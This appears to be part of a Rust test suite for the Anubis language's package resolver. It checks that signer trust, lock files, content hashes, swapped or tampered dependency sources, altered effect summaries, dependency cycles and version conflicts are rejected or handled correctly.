        let ws = resolve_workspace(&layout, &opts).expect("resolve");
        assert!(ws.deps.contains_key("math"));
        assert!(app.join(LOCK_FILENAME).is_file());

        let items = resolve::combine_from_entry_opts(
            &app.join("main.anb"),
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: false,
                allow_unsigned: false,
                skip_proof: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .expect("combine");
        let names: Vec<_> = items
            .iter()
            .filter_map(|it| match it {
                frontend::Item::Fn { name, .. } => Some(name.clone()),
                _ => None,
            })
            .collect();
        assert!(
            names.iter().any(|n| n == "math__add"),
            "expected math__add in {names:?}"
        );
        typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).expect("typecheck");
    }

    #[test]
    fn phase6_untrusted_signer_fails_closed() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("math_lib");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.0.0\"\n",
        );
        write(&lib, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        let lib_src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let _pk = seal_signed_evidence(&lib, &lib_src);
        // Empty trust store — do not add signer
        let trust_path = root.join("trust/signers.toml");
        TrustStore::default().save(&trust_path).unwrap();

        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = { path = \"../math_lib\" }\n",
        );
        write(&app, "main.anb", "import math;\nfn main() { print(1); }\n");

        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let err = resolve_workspace(
            &layout,
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: true,
                skip_proof: false,
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(
            err.contains("ANUBIS_DEP_UNTRUSTED_SIGNER"),
            "got: {err}"
        );
    }

    #[test]
    fn phase6_lock_missing_fails() {
        let tmp = tempfile::tempdir().unwrap();
        let app = tmp.path().join("app");
        std::fs::create_dir_all(&app).unwrap();
        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = { path = \"../nope\" }\n",
        );
        write(&app, "main.anb", "fn main() { print(1); }\n");
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let err = resolve_workspace(&layout, &ResolveOptions::default()).unwrap_err();
        assert!(err.contains("ANUBIS_LOCK_MISSING"), "got: {err}");
    }

    #[test]
    fn phase6_content_hash_mismatch() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("math_lib");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.0.0\"\n",
        );
        write(&lib, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        let lib_src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let pk = seal_signed_evidence(&lib, &lib_src);
        let trust_path = root.join("trust/signers.toml");
        let mut trust = TrustStore::default();
        trust.add(&pk, "t");
        trust.save(&trust_path).unwrap();

        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = { path = \"../math_lib\" }\n",
        );
        write(&app, "main.anb", "fn main() {}\n");
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        resolve_workspace(
            &layout,
            &ResolveOptions {
                trust_path: Some(trust_path.clone()),
                write_lock: true,
                skip_proof: false,
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .unwrap();
        // Tamper dep source after lock
        std::fs::write(lib.join("src/lib.anb"), "pub fn add(a, b) { return 0; }\n").unwrap();
        let err = resolve_workspace(
            &layout,
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: false,
                skip_proof: true, // hash check still runs
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(
            err.contains("ANUBIS_CACHE_HASH_MISMATCH"),
            "got: {err}"
        );
    }

    #[test]
    fn phase6_evidence_source_must_match_package_module() {
        // Swap attack: signed evidence for benign source, package module is different.
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("math_lib");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.0.0\"\n",
        );
        let benign = "pub fn add(a, b) { return a + b; }\n";
        write(&lib, "src/lib.anb", benign);
        let pk = seal_signed_evidence(&lib, benign);
        // After sealing, replace package module with different body (evidence still benign).
        write(
            &lib,
            "src/lib.anb",
            "pub fn add(a, b) { return 0; /* swapped */ }\n",
        );
        let trust_path = root.join("trust.toml");
        let mut trust = TrustStore::default();
        trust.add(&pk, "t");
        trust.save(&trust_path).unwrap();
        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = { path = \"../math_lib\" }\n",
        );
        write(&app, "main.anb", "fn main() {}\n");
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let err = resolve_workspace(
            &layout,
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: true,
                skip_proof: false,
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(
            err.contains("ANUBIS_DEP_PROOF_UNVERIFIED")
                && (err.contains("does not match package") || err.contains("unbound")),
            "got: {err}"
        );
    }

    #[test]
    fn phase6_package_trust_signers_in_toml() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("math_lib");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.0.0\"\n",
        );
        write(&lib, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        let lib_src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let pk = seal_signed_evidence(&lib, &lib_src);
        // Empty global trust store — only project [package.trust]
        let trust_path = root.join("empty_trust.toml");
        TrustStore::default().save(&trust_path).unwrap();
        write(
            &app,
            "Anubis.toml",
            &format!(
                "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[package.trust]\nsigners = [\"{pk}\"]\n\n[dependencies]\nmath = {{ path = \"../math_lib\" }}\n"
            ),
        );
        write(
            &app,
            "main.anb",
            "import math;\nfn main() { print(math::add(1, 1)); }\n",
        );
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        assert!(
            layout.manifest.package.trust.signers.iter().any(|s| s == &pk),
            "manifest must parse [package.trust] signers"
        );
        let ws = resolve_workspace(
            &layout,
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: true,
                skip_proof: false,
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .expect("project trust should accept signer");
        assert!(ws.deps.contains_key("math"));
    }

    #[test]
    fn phase6_taint_and_effect_inherit_at_consumer() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("io_lib");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"iolib\"\nversion = \"1.0.0\"\n",
        );
        // Effectful export + taint-preserving param (Phase-3 interproc is args/params-based).
        write(
            &lib,
            "src/lib.anb",
            "pub fn need_shell() uses(shell) { return 1; }\npub fn identity(x: tainted<u64>) -> tainted<u64> { return x; }\n",
        );
        let lib_src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let pk = seal_signed_evidence(&lib, &lib_src);
        let trust_path = root.join("trust.toml");
        let mut trust = TrustStore::default();
        trust.add(&pk, "t");
        trust.save(&trust_path).unwrap();
        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\niolib = { path = \"../io_lib\" }\n",
        );
        write(
            &app,
            "main.anb",
            "import iolib;\nfn main() { print(iolib::need_shell()); }\n",
        );
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let opts = ResolveOptions {
            trust_path: Some(trust_path.clone()),
            write_lock: true,
            skip_proof: false,
            allow_unsigned: false,
            cache_root: Some(root.join("cache")),
            registry_root: Some(root.join("registry")),
                ..Default::default()
            };
        resolve_workspace(&layout, &opts).expect("resolve");
        let items = resolve::combine_from_entry_opts(
            &app.join("main.anb"),
            &ResolveOptions {
                trust_path: Some(trust_path.clone()),
                write_lock: false,
                skip_proof: false,
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .expect("combine");
        let err = typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).unwrap_err();
        assert!(
            err.contains("ANUBIS_EFFECT_FORBIDDEN_IN_MODE") || err.contains("shell"),
            "effect must inherit across package mount: {err}"
        );

        // Taint: consumer sinks value that only flows through dep identity (param-tainted).
        write(
            &app,
            "main.anb",
            "import iolib;\nfn sink(x: u64) { print(x); }\nfn main() {\n  let s: tainted<u64> = 9;\n  sink(iolib::identity(s));\n}\n",
        );
        let items = resolve::combine_from_entry_opts(
            &app.join("main.anb"),
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: false,
                skip_proof: false,
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .expect("combine taint");
        let err = typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).unwrap_err();
        assert!(
            err.contains("ANUBIS_TAINTED_SINK") || err.contains("taint") || err.contains("TAINTED"),
            "taint must inherit across package mount: {err}"
        );
    }

    #[test]
    fn phase6_missing_evidence_fails_closed() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("math_lib");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.0.0\"\n",
        );
        write(&lib, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        // No evidence/
        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = { path = \"../math_lib\" }\n",
        );
        write(&app, "main.anb", "fn main() {}\n");
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let err = resolve_workspace(
            &layout,
            &ResolveOptions {
                write_lock: true,
                skip_proof: false,
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                trust_path: Some(root.join("trust.toml")),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(
            err.contains("ANUBIS_DEP_PROOF_UNVERIFIED"),
            "got: {err}"
        );
    }

    #[test]
    fn phase6_git_rev_required() {
        let tmp = tempfile::tempdir().unwrap();
        let app = tmp.path().join("app");
        std::fs::create_dir_all(&app).unwrap();
        write(
            &app,
            "Anubis.toml",
            r#"[package]
name = "app"
version = "0.1.0"

[dependencies]
math = { git = "https://example.invalid/math.git" }
"#,
        );
        write(&app, "main.anb", "fn main() {}\n");
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let err = resolve_workspace(
            &layout,
            &ResolveOptions {
                write_lock: true,
                skip_proof: true,
                allow_unsigned: true,
                cache_root: Some(tmp.path().join("cache")),
                registry_root: Some(tmp.path().join("registry")),
                trust_path: Some(tmp.path().join("trust.toml")),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(
            err.contains("ANUBIS_GIT_REV_REQUIRED"),
            "got: {err}"
        );
    }

    #[test]
    fn phase6_git_local_repo_resolves_and_typechecks() {
        // Offline git source: local repo + pinned rev (no network).
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let repo = root.join("math_repo");
        let app = root.join("app");
        std::fs::create_dir_all(repo.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &repo,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.0.0\"\n",
        );
        write(&repo, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        let lib_src = std::fs::read_to_string(repo.join("src/lib.anb")).unwrap();
        let pk = seal_signed_evidence(&repo, &lib_src);

        // Init git, commit, capture rev.
        let git = |args: &[&str]| {
            let st = std::process::Command::new("git")
                .args(args)
                .current_dir(&repo)
                .env("GIT_AUTHOR_NAME", "anubis")
                .env("GIT_AUTHOR_EMAIL", "anubis@test")
                .env("GIT_COMMITTER_NAME", "anubis")
                .env("GIT_COMMITTER_EMAIL", "anubis@test")
                .status()
                .expect("git");
            assert!(st.success(), "git {:?} failed", args);
        };
        git(&["init"]);
        git(&["add", "-A"]);
        git(&["commit", "-m", "init"]);
        let rev = String::from_utf8(
            std::process::Command::new("git")
                .args(["rev-parse", "HEAD"])
                .current_dir(&repo)
                .output()
                .expect("rev-parse")
                .stdout,
        )
        .unwrap()
        .trim()
        .to_string();
        assert!(!rev.is_empty());

        let trust_path = root.join("trust.toml");
        let mut trust = TrustStore::default();
        trust.add(&pk, "git");
        trust.save(&trust_path).unwrap();

        let git_url = format!("file://{}", repo.display());
        write(
            &app,
            "Anubis.toml",
            &format!(
                "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = {{ git = \"{git_url}\", rev = \"{rev}\" }}\n"
            ),
        );
        write(
            &app,
            "main.anb",
            "import math;\nfn main() { print(math::add(2, 2)); }\n",
        );

        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let opts = ResolveOptions {
            trust_path: Some(trust_path.clone()),
            write_lock: true,
            skip_proof: false,
            allow_unsigned: false,
            cache_root: Some(root.join("cache")),
            registry_root: Some(root.join("registry")),
                ..Default::default()
            };
        let ws = resolve_workspace(&layout, &opts).expect("git resolve");
        assert!(ws.deps.contains_key("math"));
        assert!(app.join(LOCK_FILENAME).is_file());
        let lock_txt = std::fs::read_to_string(app.join(LOCK_FILENAME)).unwrap();
        assert!(
            lock_txt.contains("source = \"git\"") || lock_txt.contains("source = 'git'"),
            "lock must record git source: {lock_txt}"
        );
        assert!(
            lock_txt.contains(&rev),
            "lock must pin rev {rev}: {lock_txt}"
        );

        let items = resolve::combine_from_entry_opts(
            &app.join("main.anb"),
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: false,
                skip_proof: false,
                allow_unsigned: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .expect("combine git dep");
        assert!(
            items.iter().any(|it| matches!(it, frontend::Item::Fn { name, .. } if name == "math__add")),
            "expected math__add from git dep"
        );
        typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).expect("typecheck");
    }

    #[test]
    fn phase6_transitive_path_deps_lock_and_mount() {
        // app → mid → leaf; lock must contain both mid and leaf.
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let leaf = root.join("leaf");
        let mid = root.join("mid");
        let app = root.join("app");
        for p in [&leaf, &mid, &app] {
            std::fs::create_dir_all(p.join("src")).unwrap_or_else(|_| {
                std::fs::create_dir_all(p).unwrap();
            });
        }
        std::fs::create_dir_all(leaf.join("src")).unwrap();
        std::fs::create_dir_all(mid.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();

        write(
            &leaf,
            "Anubis.toml",
            "[package]\nname = \"leaf\"\nversion = \"1.0.0\"\n",
        );
        write(&leaf, "src/lib.anb", "pub fn ten() { return 10; }\n");
        let leaf_src = std::fs::read_to_string(leaf.join("src/lib.anb")).unwrap();
        let pk_leaf = seal_signed_evidence(&leaf, &leaf_src);

        write(
            &mid,
            "Anubis.toml",
            "[package]\nname = \"mid\"\nversion = \"1.0.0\"\n\n[dependencies]\nleaf = { path = \"../leaf\" }\n",
        );
        // mid declares leaf transitively; body is self-contained so isolated PCA typecheck PASSes
        // (import of external packages is resolved at consumer combine, not package seal time).
        write(&mid, "src/lib.anb", "pub fn twenty() { return 20; }\n");
        let mid_src = std::fs::read_to_string(mid.join("src/lib.anb")).unwrap();
        let pk_mid = seal_signed_evidence(&mid, &mid_src);

        let trust_path = root.join("trust.toml");
        let mut trust = TrustStore::default();
        trust.add(&pk_leaf, "leaf");
        trust.add(&pk_mid, "mid");
        trust.save(&trust_path).unwrap();

        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmid = { path = \"../mid\" }\n",
        );
        write(
            &app,
            "main.anb",
            "import mid;\nimport leaf;\nfn main() { print(mid::twenty() + leaf::ten()); }\n",
        );

        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let opts = ResolveOptions {
            trust_path: Some(trust_path.clone()),
            write_lock: true,
            cache_root: Some(root.join("cache")),
            registry_root: Some(root.join("registry")),
            ..Default::default()
        };
        let ws = resolve_workspace(&layout, &opts).expect("transitive resolve");
        assert!(ws.deps.contains_key("mid"), "direct mid");
        assert!(ws.deps.contains_key("leaf"), "transitive leaf");
        assert!(ws.deps["mid"].direct);
        assert!(!ws.deps["leaf"].direct);
        let lock = std::fs::read_to_string(app.join(LOCK_FILENAME)).unwrap();
        assert!(lock.contains("name = \"leaf\"") || lock.contains("name = 'leaf'"));
        assert!(lock.contains("name = \"mid\"") || lock.contains("name = 'mid'"));

        let items = resolve::combine_from_entry_opts(
            &app.join("main.anb"),
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: false,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .expect("combine transitive");
        let names: Vec<_> = items
            .iter()
            .filter_map(|it| match it {
                frontend::Item::Fn { name, .. } => Some(name.clone()),
                _ => None,
            })
            .collect();
        assert!(names.iter().any(|n| n == "leaf__ten"), "{names:?}");
        assert!(names.iter().any(|n| n == "mid__twenty"), "{names:?}");
        typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).expect("typecheck");
    }

    #[test]
    fn phase6_dep_cycle_fails_closed() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let a = root.join("a");
        let b = root.join("b");
        std::fs::create_dir_all(a.join("src")).unwrap();
        std::fs::create_dir_all(b.join("src")).unwrap();
        write(
            &a,
            "Anubis.toml",
            "[package]\nname = \"a\"\nversion = \"1.0.0\"\n\n[dependencies]\nb = { path = \"../b\" }\n",
        );
        write(&a, "src/lib.anb", "pub fn a() { return 1; }\n");
        write(
            &b,
            "Anubis.toml",
            "[package]\nname = \"b\"\nversion = \"1.0.0\"\n\n[dependencies]\na = { path = \"../a\" }\n",
        );
        write(&b, "src/lib.anb", "pub fn b() { return 2; }\n");
        // Skip proof — cycle detection is structural
        let app = root.join("app");
        std::fs::create_dir_all(&app).unwrap();
        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\na = { path = \"../a\" }\n",
        );
        write(&app, "main.anb", "fn main() {}\n");
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let err = resolve_workspace(
            &layout,
            &ResolveOptions {
                write_lock: true,
                skip_proof: true,
                skip_summaries: true,
                allow_unsigned: true,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(err.contains("ANUBIS_DEP_CYCLE"), "got: {err}");
    }

    #[test]
    fn phase6_version_conflict_fails_closed() {
        // app needs foo@1 via path A and bar which needs foo@2 via path B
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let foo1 = root.join("foo1");
        let foo2 = root.join("foo2");
        let bar = root.join("bar");
        let app = root.join("app");
        for d in [&foo1, &foo2, &bar] {
            std::fs::create_dir_all(d.join("src")).unwrap();
        }
        std::fs::create_dir_all(&app).unwrap();
        write(
            &foo1,
            "Anubis.toml",
            "[package]\nname = \"foo\"\nversion = \"1.0.0\"\n",
        );
        write(&foo1, "src/lib.anb", "pub fn f() { return 1; }\n");
        write(
            &foo2,
            "Anubis.toml",
            "[package]\nname = \"foo\"\nversion = \"2.0.0\"\n",
        );
        write(&foo2, "src/lib.anb", "pub fn f() { return 2; }\n");
        write(
            &bar,
            "Anubis.toml",
            "[package]\nname = \"bar\"\nversion = \"1.0.0\"\n\n[dependencies]\nfoo = { path = \"../foo2\" }\n",
        );
        write(&bar, "src/lib.anb", "pub fn b() { return 3; }\n");
        write(
            &app,
            "Anubis.toml",
            "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nfoo = { path = \"../foo1\" }\nbar = { path = \"../bar\" }\n",
        );
        write(&app, "main.anb", "fn main() {}\n");
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let err = resolve_workspace(
            &layout,
            &ResolveOptions {
                write_lock: true,
                skip_proof: true,
                skip_summaries: true,
                allow_unsigned: true,
                cache_root: Some(root.join("cache")),
                registry_root: Some(root.join("registry")),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(
            err.contains("ANUBIS_DEP_VERSION_CONFLICT"),
            "got: {err}"
        );
    }

    #[test]
    fn phase6_file_registry_url_resolves() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let reg = root.join("reg");
        let lib = root.join("math_src");
        let app = root.join("app");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        std::fs::create_dir_all(&app).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"math\"\nversion = \"1.2.0\"\n",
        );
        write(&lib, "src/lib.anb", "pub fn add(a, b) { return a + b; }\n");
        let src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let pk = seal_signed_evidence(&lib, &src);
        crate::package::registry::publish_to_registry(&reg, "math", "1.2.0", &lib).unwrap();

        let trust_path = root.join("trust.toml");
        let mut trust = TrustStore::default();
        trust.add(&pk, "t");
        trust.save(&trust_path).unwrap();

        let url = format!("file://{}", reg.display());
        write(
            &app,
            "Anubis.toml",
            &format!(
                "[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\nmath = {{ version = \"^1.0\", registry = \"{url}\" }}\n"
            ),
        );
        write(
            &app,
            "main.anb",
            "import math;\nfn main() { print(math::add(1, 1)); }\n",
        );
        let layout = ProjectLayout::discover(&app.join("main.anb")).unwrap();
        let ws = resolve_workspace(
            &layout,
            &ResolveOptions {
                trust_path: Some(trust_path),
                write_lock: true,
                registry_root: Some(root.join("empty_local_reg")),
                cache_root: Some(root.join("cache")),
                ..Default::default()
            },
        )
        .expect("file registry");
        assert_eq!(ws.deps["math"].version, "1.2.0");
    }

    #[test]
    fn phase6_summaries_detect_effect_lie() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path();
        let lib = root.join("lib");
        std::fs::create_dir_all(lib.join("src")).unwrap();
        write(
            &lib,
            "Anubis.toml",
            "[package]\nname = \"lib\"\nversion = \"1.0.0\"\n",
        );
        write(
            &lib,
            "src/lib.anb",
            "pub fn need_shell() uses(shell) { return 1; }\n",
        );
        let src = std::fs::read_to_string(lib.join("src/lib.anb")).unwrap();
        let _pk = seal_signed_evidence(&lib, &src);
        // Tamper sealed summaries: strip shell effect
        let sum_path = lib.join("evidence/summaries.json");
        let mut sum: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&sum_path).unwrap()).unwrap();
        sum["functions"][0]["effects"] = serde_json::json!([]);
        std::fs::write(&sum_path, serde_json::to_string_pretty(&sum).unwrap()).unwrap();
        // Rehash MANIFEST so PCA hash layer is consistent — summary verify must still fail.
        evidence::refresh_manifest_hashes(&lib.join("evidence")).unwrap();
        let err = crate::package::summary::verify_against_package(&lib, &lib.join("evidence"))
            .unwrap_err();
        assert!(
            err.contains("ANUBIS_DEP_PROOF_UNVERIFIED") && err.contains("summaries"),
            "got: {err}"
        );
    }
}
